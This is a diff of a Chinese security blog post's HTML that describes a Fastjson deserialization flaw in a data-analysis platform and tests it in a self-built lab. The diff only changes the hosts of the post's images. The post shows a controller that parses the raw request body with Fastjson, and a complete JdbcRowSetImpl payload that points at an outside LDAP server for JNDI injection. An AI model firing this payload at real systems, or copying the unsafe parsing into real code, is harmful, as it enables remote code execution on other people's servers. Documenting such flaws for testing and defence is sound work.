@@ -18,16 +18,17 @@
 <meta property="og:site_name" content="novy&#39;s Blog">
 <meta property="og:description" content="某数据分析平台反序列化">
 <meta property="og:locale">
-<meta property="og:image" content="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1606893070763.png">
-<meta property="og:image" content="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1606893112887.png">
-<meta property="og:image" content="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1606893219039.png">
-<meta property="og:image" content="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/asaa1606893345847.png">
+<meta property="og:image" content="http://634880.haituie.cn/634880/37/1.png">
+<meta property="og:image" content="http://634880.haituie.cn/634880/37/2.png">
+<meta property="og:image" content="http://634880.haituie.cn/634880/37/3.png">
+<meta property="og:image" content="http://634880.haituie.cn/634880/37/4.png">
+<meta property="og:image" content="http://634880.haituie.cn/634880/37/5.png">
 <meta property="article:published_time" content="2020-11-21T03:14:21.000Z">
-<meta property="article:modified_time" content="2020-12-02T07:17:49.563Z">
+<meta property="article:modified_time" content="2021-01-22T07:57:06.049Z">
 <meta property="article:author" content="novy&#39;s Blog">
 <meta property="article:tag" content="fastjson反序列化">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1606893070763.png">
+<meta name="twitter:image" content="http://634880.haituie.cn/634880/37/1.png">
 
     
     <link rel="alternative" href="/atom.xml" title="novy&#39;s Blog" type="application/atom+xml">
@@ -113,13 +114,13 @@
 		
 		</div>
 		
-		<h1 id="代码分析："><a href="#代码分析：" class="headerlink" title="代码分析："></a>代码分析：</h1><p>src/main/java/org/xxxxx/controller/CommonsController.java 49行<br>这里用了一个@RequestBody注解，获取整个请求体进行反序列化<br><img src="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1606893070763.png"><br>查看Fastjson版本：<br><img src="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1606893112887.png"></p>
-<h1 id="漏洞验证："><a href="#漏洞验证：" class="headerlink" title="漏洞验证："></a>漏洞验证：</h1><p>因为没有演示环境而且这个社区版启动会报错，所以直接仿此处写个小靶场<br>创建一个springmvc web项目，pom中引入组件<br><img src="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1606893219039.png"><br>新建利用类</p>
+		<h1 id="代码分析："><a href="#代码分析：" class="headerlink" title="代码分析："></a>代码分析：</h1><p>src/main/java/org/xxxxx/controller/CommonsController.java 49行<br>这里用了一个@RequestBody注解，获取整个请求体进行反序列化<br><img src="http://634880.haituie.cn/634880/37/1.png"><br>查看Fastjson版本：<br><img src="http://634880.haituie.cn/634880/37/2.png"></p>
+<h1 id="漏洞验证："><a href="#漏洞验证：" class="headerlink" title="漏洞验证："></a>漏洞验证：</h1><p>因为没有演示环境而且这个社区版启动会报错，所以直接仿此处写个小靶场<br>创建一个springmvc web项目，pom中引入组件<br><img src="http://634880.haituie.cn/634880/37/3.png"><br>新建利用类<br><img src="http://634880.haituie.cn/634880/37/4.png"></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/test&quot;)</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">persist</span><span class="params">(<span class="meta">@RequestBody</span> String dataStr)</span> </span>&#123;</span><br><span class="line">       JSONObject data = JSONObject.parseObject(dataStr);</span><br><span class="line">       <span class="keyword">return</span> dataStr;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
 
 <p>Payload：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;name&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,<span class="string">&quot;x&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://192.168.83.11:1389/o=tomcat&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;&#125;<span class="string">&quot;;</span></span><br></pre></td></tr></table></figure>
-<p>发送请求<br><img src="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/asaa1606893345847.png"></p>
+<p>发送请求<br><img src="http://634880.haituie.cn/634880/37/5.png"></p>
   
 	</div>
 		<footer class="article-footer clearfix">
